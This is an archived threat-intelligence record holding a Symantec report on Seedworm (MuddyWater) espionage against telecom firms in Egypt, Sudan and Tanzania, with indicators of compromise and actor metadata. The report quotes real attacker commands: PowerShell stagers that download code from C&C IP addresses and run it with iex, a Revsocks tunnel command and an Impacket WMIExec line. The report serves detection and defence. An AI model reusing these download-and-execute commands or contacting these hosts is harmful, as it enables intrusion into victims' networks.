{
    "id": "5d467a00-6cc2-4701-a7e7-f16cd294e6d5",
    "created_at": "2024-01-17T02:05:37.081637Z",
    "updated_at": "2025-03-27T02:16:14.054805Z",
    "deleted_at": null,
    "sha1_hash": "105d2dad10219b0e6106a0fb55c6a00e7faf401d",
    "title": "",
    "authors": "",
    "file_creation_date": "2024-01-16T03:57:32Z",
    "file_modification_date": "2024-01-16T03:57:32Z",
    "file_size": 463818,
    "plain_text": "# Seedworm: Iranian Hackers Target Telecoms Orgs in North and East Africa\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/iran-apt-seedworm-africa-telecoms](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/iran-apt-seedworm-africa-telecoms)**\n\nIranian espionage group Seedworm (aka Muddywater) has been targeting organizations\noperating in the telecommunications sector in Egypt, Sudan, and Tanzania.\n\nSeedworm has been active since at least 2017, and has targeted organizations in many\ncountries, though it is most strongly associated with attacks on organizations in the\n[Middle East. It has been publicly stated that Seedworm is a cyberespionage group that is](https://attack.mitre.org/groups/G0069/)\nbelieved to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS).\n\nThe attackers used a variety of tools in this activity, which occurred in November 2023,\n[including leveraging the MuddyC2Go infrastructure, which was recently discovered and](https://www.deepinstinct.com/blog/muddyc2go-latest-c2-framework-used-by-iranian-apt-muddywater-spotted-in-israel)\n[documented by Deep Instinct. Researchers on Symantec’s Threat Hunter Team, part of](https://www.deepinstinct.com/blog/muddyc2go-latest-c2-framework-used-by-iranian-apt-muddywater-spotted-in-israel)\nBroadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.\n\n\n-----\n\nThe attackers also use the SimpleHelp remote access tool and Venom Proxy, which have\npreviously been associated with Seedworm activity, as well as using a custom keylogging\ntool, and other publicly available and living-off-the-land tools.\n\n## Attack Chain\n\nThe attacks in this campaign occurred in November 2023. Most of the activity we\nobserved occurred on one telecommunications organization. The first evidence of\nmalicious activity was some PowerShell executions related to the MuddyC2Go backdoor.\n\nA MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder\n“csidl_common_appdata\\javax”, which seems to have been sideloaded by jabswitch.exe.\nJabswitch.exe is a legitimate Java Platform SE 8 executable.\n\nThe MuddyC2Go launcher executed the following PowerShell code to connect to its\ncommand-and-control (C&C) server:\n```\ntppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tpp\nmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=\"tppmjy\nfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp\";$uri\n=\"http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf\";$response =\nInvoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop usebasicparsing;iex $response.Content;\n\n```\nIt appears that the variables at the beginning of the code are there for the purposes of\nattempting to bypass detection by security software, as they are unused and not relevant.\n\nRight after this execution, attackers launched the MuddyC2Go malware using a\nscheduled task that had previously been created:\n```\n\"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\"\n\n```\nThe attackers also used some typical commands related to the Impacket WMIExec\nhacktool:\n```\ncmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1698662615.0451615 2>&1\n\n```\nThe SimpleHelp remote access tool was also leveraged, connecting to the\n146.70.124[.]102 C&C server. Further PowerShell stager execution also occurred, while\nthe attacker also executed the Revsocks tool:\n```\nCSIDL_COMMON_APPDATA\\do.exe -co 94.131.3.160:443 -pa super -q\n\n```\nThe attackers also used a second legitimate remote access tool, AnyDesk, which was\ndeployed on the same computer as Revsocks and SimpleHelp, while PowerShell\nexecutions related to MuddyC2Go also occurred on the same machine:\n\n\n-----\n\n```\n$uri =\"http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT\";$response\n= Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop usebasicparsing;iex $response.Content;\n\n```\nNotably, this organization is believed to have previously been infiltrated by Seedworm\nearlier in 2023. The primary activity of note during that intrusion was extensive use of\nSimpleHelp to carry out a variety of activity, including:\n\nLaunching PowerShell\nLaunching a proxy tool\nDumping SAM hives\nUsing WMI to get drive info\nInstalling the JumpCloud remote access software\nDelivering proxy tools, a suspected LSASS dump tool, and a port scanner.\n\nDuring that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp\ninstaller on the victim network. At the time, this activity couldn’t be definitively linked to\nSeedworm, but this subsequent activity appears to show that the earlier activity was\ncarried out by the same group of attackers.\n\nIn another telecommunications and media company targeted by the attackers, multiple\nincidents of SimpleHelp were used to connect to known Seedworm infrastructure. A\ncustom build of the Venom Proxy hacktool was also executed on this network, as well as\nthe new custom keylogger used by the attackers in this activity.\n\nIn the third organization targeted, Venom Proxy was also used, in addition to AnyDesk\nand suspicious Windows Scripting Files (WSF) that have been associated with\nSeedworm activity in the past.\n\n## Toolset\n\nThe most interesting part of the toolset used in this activity is probably the presence of the\nMuddyC2Go launcher, which was sideloaded by jabswitch.exe.\n\nThe malware reads the C&C URL from the Windows registry value “End” stored inside the\nkey “HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip”. The URL path is read from\nthe “Status” value in the same aforementioned key.\n\nLastly, the MuddyC2GO launcher executes the following PowerShell command to contact\nits C&C server and execute the PowerShell code received:\n```\npowershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output\n$response.Content;iex $response.Content;\n\n```\n\n-----\n\n[The MuddyC2Go framework was first publicly written about in a blog published by Deep](https://www.deepinstinct.com/blog/muddyc2go-latest-c2-framework-used-by-iranian-apt-muddywater-spotted-in-israel)\n[Instinct researchers on November 8, 2023. That blog documented its use in attacks on](https://www.deepinstinct.com/blog/muddyc2go-latest-c2-framework-used-by-iranian-apt-muddywater-spotted-in-israel)\norganizations in countries in the Middle East. The researchers said the framework may\nhave been used by Seedworm since 2020. They also said that the framework, which is\nwritten in Go, has replaced Seedworm’s previous PhonyC2 C&C infrastructure. This\n[replacement appears to have occurred after the PhonyC2 source code was leaked earlier](https://www.deepinstinct.com/blog/phonyc2-revealing-a-new-malicious-command-control-framework-by-muddywater)\n[in 2023. The full capabilities of MuddyC2Go are not yet known, but the executable](https://www.deepinstinct.com/blog/phonyc2-revealing-a-new-malicious-command-control-framework-by-muddywater)\ncontains an embedded PowerShell script that automatically connects to Seedworm’s\nC&C server, which eliminates the need for manual execution by an operator and gives the\nattackers remote access to a victim machine. Deep Instinct said it was able to link\nMuddyC2Go to attacks dating back to 2020 due to the unique URL patterns generated by\nthe framework. It also said that the MuddyC2Go servers it observed were hosted at “Stark\nIndustries”, which is a VPS provider that is known to host malicious activity.\n\nOther tools of note used in this activity included SimpleHelp, which is a legitimate remote\ndevice control and management tool, for persistence on victim machines. SimpleHelp is\n[believed to have been used in attacks carried out by Seedworm since at least July 2022.](https://www.group-ib.com/blog/muddywater-infrastructure/)\nOnce installed on a victim device, SimpleHelp can constantly run as a system service,\nwhich makes it possible for attackers to gain access to the user’s device at any point in\ntime, even after a reboot. SimpleHelp also allows attackers to execute commands on a\ndevice with administrator privileges. SimpleHelp is now strongly associated with\nSeedworm activity and the tool is installed on several of Seedworm’s servers.\n\n[Venom Proxy is a publicly available tool that is described as “a multi-hop proxy tool](https://github.com/Dliv3/Venom/blob/master/README-en.md)\ndeveloped for penetration testers.” It is written in Go. It can be used to easily proxy\nnetwork traffic to a multi-layer intranet, and easily manage intranet nodes. It has been\n[associated with Seedworm since at least mid-2022, with Microsoft describing it as](https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/)\n[Seedworm’s “tool of choice” in an August 2022 blog. Seedworm tends to use a custom](https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/)\nbuild of Venom Proxy in its activity.\n\nOther tools used in this activity include:\n\n**[Revsocks - A cross-platform SOCKS5 proxy server program/library written in C that](https://github.com/emilarner/revsocks)**\ncan also reverse itself over a firewall.\n**[AnyDesk - A legitimate remote desktop application. It and similar tools are often](https://anydesk.com/en)**\nused by attackers to obtain remote access to computers on a network.\n**PowerShell - Seedworm makes heavy use of PowerShell, as well as PowerShell-**\n[based tools and scripts in its attacks. PowerShell is a Microsoft scripting tool that](https://learn.microsoft.com/en-us/powershell/)\ncan be used to run commands, download payloads, traverse compromised\nnetworks, and carry out reconnaissance.\n**Custom keylogger**\n\n\n-----\n\n## Conclusion\n\nSeedworm has long had an interest in telecommunications organizations, as do many\ngroups engaged in cyberespionage activities. However, its strong focus on African\norganizations in this campaign is notable as, while it has been known to target\norganizations in Africa in the past, it does generally primarily focus on organizations in\ncountries in the Middle East. That one of the victim organizations in this campaign is\nbased in Egypt is also of note given Egypt’s proximity to Israel, a frequent target of\nSeedworm.\n\nSeedworm appears to remain focused on using a wide array of living-off-the-land and\npublicly available tools in its attack chains, no doubt in an effort to remain undetected on\nvictim networks for as long as possible. However, its recent more wide adoption of new\nC&C infrastructure in the form of MuddyC2Go is notable and shows that the group\ncontinues to innovate and develop its toolset when required in order to keep its activity\nunder the radar. While the group uses a lot of living-off-the-land and publicly available\ntools, it is also capable of developing its own custom tools, such as the custom build of\nVenom Proxy and the custom keylogger used in this campaign. The group still makes\nheavy use of PowerShell and PowerShell-related tools and scripts, underlining the need\nfor organizations to be aware of suspicious use of PowerShell on their networks.\n\nThe activity observed by Symantec’s Threat Hunter Team took place in November 2023,\nshowing that Seedworm is very much a currently active threat faced by organizations that\nmay be of strategic interest to Iranian threat actors.\n\n## Protection/Mitigation\n\n[For the latest protection updates, please visit the Symantec Protection Bulletin.](https://www.broadcom.com/support/security-center/protection-bulletin)\n\n## Indicators of Compromise\n\nIf an IOC is malicious and the file available to us, Symantec Endpoint products will detect\nand block that file.\n\n### File Indicators\n\n1a0827082d4b517b643c86ee678eaa53f85f1b33ad409a23c50164c3909fdaca –\nMuddyC2Go DLL launcher\n\n25b985ce5d7bf15015553e30927691e7673a68ad071693bf6d0284b069ca6d6a – Benign\nJava(TM) Platform SE 8 executable used for sideloading MuddyC2Go DLL\n\neac8e7989c676b9a894ef366357f1cf8e285abde083fbdf92b3619f707ce292f – Custom\nkeylogger\n\n\n-----\n\n3916ba913e4d9a46cfce437b18735bbb5cc119cc97970946a1ac4eab6ab39230 – Venom\nProxy\n\n### Network Indicators\n\n146.70.124[.]102 – SimpleHelp C&C server\n\n94.131.109[.]65 – MuddyC2Go C&C server\n\n95.164.38[.]99 –MuddyC2Go C&C server\n\n45.67.230[.]91 – MuddyC2Go C&C server\n\n45.150.64(.)39 - MuddyC2Go C&C server\n\n95.164.46[.]199 – MuddyC2Go C&C server\n\n94.131.98[.]14 – MuddyC2Go C&C server\n\n94.131.3[.]160 – GoSOCKS5proxy C&C server\n\n## About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is\nto investigate targeted attacks, drive enhanced protection in Symantec products, and\noffer analysis that helps customers respond to attacks.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2023/2023.12.19.Seedworm/Seedworm_%20Iranian%20Hackers%20Target%20Telecoms%20Orgs%20in%20North%20and%20East%20Africa%20_%20Symantec%20Enterprise%20Blogs.pdf"
    ],
    "report_names": [
        "Seedworm_ Iranian Hackers Target Telecoms Orgs in North and East Africa _ Symantec Enterprise Blogs"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1705457137,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1705377452,
    "ts_modification_date": 1705377452,
    "files": {
        "pdf": "https://archive.orkl.eu/105d2dad10219b0e6106a0fb55c6a00e7faf401d.pdf",
        "text": "https://archive.orkl.eu/105d2dad10219b0e6106a0fb55c6a00e7faf401d.txt",
        "img": "https://archive.orkl.eu/105d2dad10219b0e6106a0fb55c6a00e7faf401d.jpg"
    }
}